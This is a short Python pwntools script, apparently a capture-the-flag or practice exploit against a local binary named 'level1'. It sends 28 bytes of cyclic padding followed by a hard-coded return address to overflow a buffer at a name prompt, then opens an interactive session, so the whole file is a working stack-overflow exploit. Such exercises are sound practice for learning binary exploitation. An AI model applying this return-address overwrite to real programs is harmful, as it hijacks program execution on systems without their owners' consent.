from pwn import *

#context.log_level = 'debug'
context.local(endian='big')

payload = cyclic(28) + "\xd6\x84\x04\x08"

p = process("./level1")
pause()
p.recvuntil("What is your name :", timeout=0)

p.sendline(payload)

p.interactive()
#p.recvall()
